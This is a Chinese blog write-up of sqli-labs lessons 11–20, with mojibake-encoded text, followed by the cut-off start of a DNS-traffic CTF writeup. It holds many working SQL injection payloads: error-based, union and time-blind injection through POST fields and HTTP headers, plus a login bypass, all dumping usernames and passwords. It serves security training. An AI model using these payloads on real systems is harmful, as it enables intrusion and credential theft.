<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019133259.png" alt=""></p>
<blockquote>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œå‘é€åˆ°<code>repeater</code>æ¨¡å—ä¿®æ”¹POSTå‚æ•°ã€‚</p>
</blockquote>
<h4 id="æ–¹æ³•ä¸€-å•å¼•å·æŠ¥é”™æ³¨å…¥">æ–¹æ³•ä¸€ å•å¼•å·æŠ¥é”™æ³¨å…¥</h4>
<h5 id="çˆ†åº“payload-v3">çˆ†åº“payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id=""><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81agywyfyj217y0nm49d.jpg" alt=""></h5>
<h5 id="çˆ†è¡¨payload-v3">çˆ†è¡¨payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81an6fblvj217y0nm79y.jpg" alt=""></p>
<h5 id="çˆ†åˆ—åpayload-v2">çˆ†åˆ—åpayload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81ardx08vj217y0nmn2w.jpg" alt=""></p>
<h5 id="çˆ†å€¼payload-v2">çˆ†å€¼payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(username, 0x3a, password) from users))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81awfdnq0j217y0nmjx0.jpg" alt=""></p>
<blockquote>
<p>è®°å½•å€¼è·å–ä¸ªæ•°æœ‰é™</p>
</blockquote>
<h4 id="æ–¹æ³•äºŒ-ä½¿ç”¨è”åˆæŸ¥è¯¢">æ–¹æ³•äºŒ ä½¿ç”¨è”åˆæŸ¥è¯¢</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,2 --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„<code>uname</code>å€¼æ˜¯é”™è¯¯çš„æ—¶å€™ï¼Œæ‰èƒ½æ­£ç¡®æ˜¾ç¤ºè”åˆæŸ¥è¯¢çš„å†…å®¹</p>
</blockquote>
<p>ä¸¾ä¸€ä¸ªğŸŒ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,database() --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶ä»–çš„payloadç±»ä¼¼ã€‚</p>
<h3 id="Less-12-åŸºäºé”™è¯¯çš„POSTå‹åŒå¼•å·å­—ç¬¦å‹å˜å½¢æ³¨å…¥">Less-12 åŸºäºé”™è¯¯çš„POSTå‹åŒå¼•å·å­—ç¬¦å‹å˜å½¢æ³¨å…¥</h3>
<h4 id="æ–¹æ³•ä¸€-åŒå¼•å·æŠ¥é”™æ³¨å…¥">æ–¹æ³•ä¸€ åŒå¼•å·æŠ¥é”™æ³¨å…¥</h4>
<p>æŒ‰ç…§é¢˜æ„æŠŠLess-11ä¸­payloadçš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·åº”è¯¥å°±èƒ½æ³¨å…¥ï¼Œä½†æ˜¯åœ¨å®é™…æ“ä½œä¸­ï¼Œå‘ç°æ— è®ºæ˜¯ç”¨<code>--+</code>è¿˜æ˜¯<code>#</code>è¿˜æ˜¯<code>0x23</code>éƒ½ä¸èƒ½æ³¨é‡Šæ‰åé¢çš„å†…å®¹ã€‚</p>
<p>æŸ¥çœ‹ä¸€ä¸‹PHPæ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uname = <span class="string">&#x27;&quot;&#x27;</span>+$uname+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd = <span class="string">&#x27;&quot;&#x27;</span>+$passwd+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql = <span class="string">&quot;SELECT username, password from users where username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) limit 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ„é€ ä¸€ä¸ªèƒ½é—­åˆè€Œä¸”æŠ¥é”™çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥SQLæŸ¥è¯¢è¯­å¥å°±å˜æˆäº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username, password from users where username&#x3D;&quot;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;&quot; and password&#x3D;($passwd) limit 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯åœ¨Burpsuiteçš„repeateræ¨¡å—ä¸­ä¿®æ”¹POSTå‚æ•°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019121640.png" alt=""></p>
<h5 id="çˆ†åº“payload-v4">çˆ†åº“payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="çˆ†è¡¨payload-v4">çˆ†è¡¨payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019122304.png" alt=""></p>
<h5 id="çˆ†åˆ—åpayload-v3">çˆ†åˆ—åpayload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019122549.png" alt=""></p>
<h5 id="çˆ†å€¼payload-v3">çˆ†å€¼payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(username, &#39;::&#39;, password) from users))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019124108.png" alt=""></p>
<h4 id="æ–¹æ³•äºŒ-ä½¿ç”¨è”åˆæŸ¥è¯¢-v2">æ–¹æ³•äºŒ ä½¿ç”¨è”åˆæŸ¥è¯¢</h4>
<p>æ ¹æ®SQLæŸ¥è¯¢è¯­å¥å¯ä»¥æ„é€ ä¸€ä¸ªè”åˆæŸ¥è¯¢æ³¨å…¥çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin5&quot;) union select 1,database() --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶ä»–çš„payloadæ›¿æ¢æŸ¥è¯¢è¯­å¥å³å¯ã€‚</p>
<h3 id="Less-13-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥">Less-13 POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥</h3>
<p>å½“è¾“å…¥æ­£ç¡®ä¿¡æ¯æ—¶å‘ç°æ²¡æœ‰å›æ˜¾ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è”åˆæŸ¥è¯¢ï¼Œä½†å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚</p>
<p>ä½¿ç”¨<code>admin' and 1=1</code>åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019140947.png" alt=""></p>
<p>é€šè¿‡æŠ¥é”™ä¿¡æ¯å¯ä»¥çŸ¥é“éœ€è¦ä¸€ä¸ª<code>)</code>æ¥é—­åˆæŸ¥è¯¢è¯­å¥ï¼Œåœ¨å°è¯•<code>admin') and 1=1 and ('</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019141948.png" alt=""></p>
<p>å¯ä»¥å‘ç°æ•°æ®åº“ä¸æŠ¥é”™ï¼ŒSQLè¯­å¥å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p>
<h4 id="æ–¹æ³•ä¸€-æŠ¥é”™æ³¨å…¥">æ–¹æ³•ä¸€ æŠ¥é”™æ³¨å…¥</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;) and extractvalue(1, concat(0x7e, (select database()))) and (&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨concat()ä¸­æ„é€ æŸ¥è¯¢è¯­å¥ï¼Œå’Œless-12ä»¥åŠä¹‹å‰çš„æŠ¥é”™å‹æ³¨å…¥ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ã€‚</p>
<h4 id="æ–¹æ³•äºŒ-æ—¶é—´ç›²æ³¨">æ–¹æ³•äºŒ æ—¶é—´ç›²æ³¨</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;) and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-14-POSTå•å¼•å·åŒæ³¨å…¥">Less-14 POSTå•å¼•å·åŒæ³¨å…¥</h3>
<p>å…ˆå°è¯•ä½¿ç”¨<code>admin&quot;) and 1=1 (&quot;</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019143648.png" alt=""></p>
<p>é€šè¿‡æŠ¥é”™ä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œ è¾“å…¥å†…å®¹è¢«æ”¾åˆ°åŒå¼•å·ä¸­ ï¼Œå†æ¬¡å°è¯•`admin&quot; and 1=1#ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019144616.png" alt=""></p>
<p>è€Œä½¿ç”¨<code>admin&quot; and 1=2#</code>å‘ç°ç™»å½•å¤±è´¥ã€‚</p>
<h4 id="æ–¹æ³•ä¸€-æŠ¥é”™æ³¨å…¥-v2">æ–¹æ³•ä¸€ æŠ¥é”™æ³¨å…¥</h4>
<p>ä½¿ç”¨<code>extracvalue</code>å‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨<code>floor</code>å‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D; &quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ-æ—¶é—´ç›²æ³¨-v2">æ–¹æ³•äºŒ æ—¶é—´ç›²æ³¨</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-15-åŸºäºå¸ƒå°”å‹æˆ–æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹æ³¨å…¥">Less-15 åŸºäºå¸ƒå°”å‹æˆ–æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹æ³¨å…¥</h3>
<p>æ— è®ºæ€ä¹ˆè¾“å…¥éƒ½æ²¡æœ‰å›æ˜¾â€”&gt;æ—¶é—´å»¶è¿Ÿæ³¨å…¥ã€‚</p>
<p>å»¶è¿Ÿæµ‹è¯•payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and sleep(5) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é¡µé¢å»¶è¿Ÿæ˜æ˜¾ï¼Œç¡®å®šä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and if(length(database())&#x3D;8,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&#39; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&#39; and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">uname&#x3D;admin&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">uname&#x3D;admin&#39; and if(left((select password from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">uname&#x3D;admin&#39; and if(left((select username from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-16-åŸºäºå¸ƒå°”å‹æˆ–æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨">Less-16 åŸºäºå¸ƒå°”å‹æˆ–æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨</h3>
<p>æŠŠLess-15çš„å•å¼•å·æ”¹æˆåŒå¼•å·å³å¯ã€‚</p>
<blockquote>
<p>å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨ ä¸‡èƒ½è´¦å·ç»•è¿‡å¯†ç éªŒè¯<code>admin&quot;)# </code>éªŒè¯ã€‚</p>
</blockquote>
<h3 id="Less-17-åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥">Less-17 åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥</h3>
<p>æ— è®ºæ€ä¹ˆè¾“å…¥ä¹Ÿæ²¡æœ‰é”™è¯¯å›æ˜¾ï¼ŒæŸ¥é˜…<code>index.php</code>æºç å¯ä»¥çœ‹åˆ°<code>check_input</code>å‡½æ•°å¯¹å‚æ•°<code>uname</code>è¿›è¡Œçš„å¤„ç†ï¼Œä»”ç»†ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„æºç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019162506.png" alt=""></p>
<p>ç¬¬ä¸€æ­¥ï¼Œåªæˆªå–å‰15ä¸ªå­—ç¬¦ï¼›</p>
<p>ç¬¬äºŒæ­¥ï¼Œé¦–å…ˆä»‹ç»<code>get_magic_quotes_gpc()</code>å‡½æ•°çš„ä½œç”¨ï¼š</p>
<ul>
<li>
<p>å½“magic_quotes_gpc=Onçš„æ—¶å€™ï¼Œå‡½æ•°get_magic_quotes_gpc()å°±ä¼šè¿”å›1</p>
</li>
<li>
<p>å½“magic_quotes_gpc=Offçš„æ—¶å€™ï¼Œå‡½æ•°get_magic_quotes_gpc()å°±ä¼šè¿”å›0</p>
</li>
</ul>
<p><code>get_magic_quotes_gpc()</code>å‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰ï¼špostã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„è¯¯ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨magic_quotes_gpc = Onçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰å•å¼•å·<code>'</code>ã€åŒå¼•å·<code>&quot;</code>ã€åæ–œçº¿<code>\</code>ä¸ <code>NULL</code>ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼Œ<code>stripslashes()</code>å‡½æ•°åˆ é™¤åæ–œçº¿ï¼›</p>
<p>ç¬¬å››æ­¥ï¼Œ<code>ctype_digit()</code>å‡½æ•° åˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—å°±è¿”å›trueï¼Œå¦åˆ™è¿”å›falseï¼›</p>
<p>ç¬¬äº”æ­¥ï¼Œ<code> intval()</code>æ•´å‹è½¬æ¢ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019210958.png" alt=""></p>
<p>å¯¹<code>username</code>æäº†è¿™ä¹ˆå¤šèŠ±é‡Œèƒ¡å“¨çš„æ“ä½œï¼Œä½†æ˜¯<code>password</code>å­—æ®µè¿˜æ˜¯å…‰ç§ƒç§ƒçš„ï¼Œä½¿ç”¨<code>updatexml()</code>å‡½æ•°å¯¹<code>password</code>å­—æ®µè¿›è¡Œæ³¨å…¥ã€‚</p>
<h4 id="çˆ†åº“payload-v5">çˆ†åº“payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, database(), 0x7e),1)--+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020105155.png" alt=""></p>
<h4 id="çˆ†è¡¨åpayload">çˆ†è¡¨åpayload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020105523.png" alt=""></p>
<h4 id="çˆ†åˆ—åpayload-v4">çˆ†åˆ—åpayload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="çˆ†å€¼payload-v4">çˆ†å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‘ç°æœ‰æŠ¥é”™ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You can&#39;t specify target table &#39;tablename&#39; for update in FROM clause</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯å› ä¸ºåœ¨MySQLé‡Œï¼Œä¸èƒ½å…ˆ<code>SELECT</code>ä¸€ä¸ªè¡¨çš„è®°å½•ï¼Œåœ¨æŒ‰æ­¤æ¡ä»¶è¿›è¡Œæ›´æ–°å’Œåˆ é™¤åŒä¸€ä¸ªè¡¨çš„è®°å½•ã€‚ç½‘ä¸Šçš„è§£å†³åŠæ³•æ˜¯ï¼Œå°†<code>SELECT</code>å¾—åˆ°çš„ç»“æœï¼Œå†é€šè¿‡ä¸­é—´è¡¨<code>SELECT</code>ä¸€éï¼Œå³ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select group_concat(password) from users)),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯åˆå‡ºç°äº†æ–°çš„é”™è¯¯ä¿¡æ¯ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020110846.png" alt=""></p>
<p>åœ¨åš<strong>å¤šè¡¨æŸ¥è¯¢</strong>ï¼Œæˆ–è€…æŸ¥è¯¢çš„æ—¶å€™<strong>äº§ç”Ÿæ–°çš„è¡¨</strong>çš„æ—¶å€™ä¼šå‡ºç°è¿™ä¸ªé”™è¯¯ï¼šEvery derived table must have its own aliasï¼ˆ<strong>æ¯ä¸€ä¸ªæ´¾ç”Ÿå‡ºæ¥çš„è¡¨éƒ½å¿…é¡»æœ‰ä¸€ä¸ªè‡ªå·±çš„åˆ«å</strong>ï¼‰ã€‚</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as test),0x7e),1) --+&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020111440.png" alt=""></p>
<h3 id="Less-18-åŸºäºé”™è¯¯çš„Uagentå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥">Less-18 åŸºäºé”™è¯¯çš„Uagentå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥</h3>
<p>å¦‚æœç™»å½•æ­£å¸¸çš„è¯ï¼Œä¼šæ˜¾ç¤ºUserAgentå­—æ®µçš„ä¿¡æ¯ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020124947.png" alt=""></p>
<p>æŠ“åŒ…ä¿®æ”¹user-agentä¸ºä¸€ä¸‹payloadå°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020135010.png" alt=""></p>
<p>å…¶ä»–çš„payloadç±»ä¼¼ã€‚</p>
<h3 id="Less-19-åŸºäºé”™è¯¯çš„Referenceå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥">Less-19 åŸºäºé”™è¯¯çš„Referenceå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥</h3>
<p>æœ¬é¢˜å’Œä¸Šä¸€é¢˜å¾ˆåƒï¼Œå›æ˜¾æ˜¯refererï¼ŒæŸ¥ä¸€ä¸‹phpæ–‡ä»¶å¯ä»¥å‘ç°ï¼Œinsertè¯­å¥ä¸­å‘æ•°æ®åº“æ’å…¥äº†refererï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹æ”¹ä¸ºrefererï¼Œpaylaodå’Œä¸Šä¸€é¢˜å®Œå…¨ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥å‚ç…§less-12ï¼Œå°†å…¶åŒå¼•å·æ”¹ä¸ºå•å¼•å·ä½œä¸ºæœ¬é¢˜payloadï¼Œä¸å†èµ˜è¿°ã€‚</p>
<h3 id="Less-20-åŸºäºé”™è¯¯çš„Cookieå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥">Less-20 åŸºäºé”™è¯¯çš„Cookieå¤´éƒ¨å­—æ®µPOSTæ³¨å…¥</h3>
<p>ç™»å½•æˆåŠŸåçš„é¡µé¢ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020140033.png" alt=""></p>
<p>å†æŸ¥çœ‹ä¸€ä¸‹PHPæ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020143926.png" alt=""></p>
<p>ç”¨BurpsuiteæŠ“åŒ…æ”¹å‚æ•°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020144147.png" alt=""></p>
<p>å‘ç°æœ‰æ•°æ®åº“é”™è¯¯å›æ˜¾ï¼Œæ„é€ payloadï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020145928.png" alt=""></p>
<p>å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œé¦–å…ˆåˆ¤æ–­åˆ—æ•°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020150201.png" alt=""></p>
<p>å†æ¥æ„é€ ä¸€ä¸ªæ ·ä¾‹payloadï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020150343.png" alt=""></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v1</title>
    <url>/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1/</url>
    <content><![CDATA[<h1 id="Datacon2019-q1-Writeup-v1">Datacon2019-q1-Writeup-v1</h1>
<h2 id="ä¸€ã€é¢˜ç›®è¯´æ˜">ä¸€ã€é¢˜ç›®è¯´æ˜</h2>
<ol>
<li>é¢˜ç›®èƒŒæ™¯<br>
å‡å¦‚ä½ æ˜¯æŸç½‘ç»œçš„ç®¡ç†å‘˜ï¼Œè¿‘æ—¥æ¥åˆ°å‘Šè­¦ç§°ï¼Œç½‘ç»œä¸­å­˜åœ¨ DNS æ”»å‡»è¡Œä¸ºï¼Œå¸Œæœ›ä½ è¿›è¡Œè°ƒæŸ¥ã€‚ç°æ•è·åˆ°ç½‘ç»œä¸­çš„ DNS æµé‡ï¼Œè¯·å¯¹å…¶ä¸­çš„æ”»å‡»è¡Œä¸ºè¿›è¡Œåˆ†æã€‚</li>
<li>é¢˜ç›®è¦ç‚¹<br>
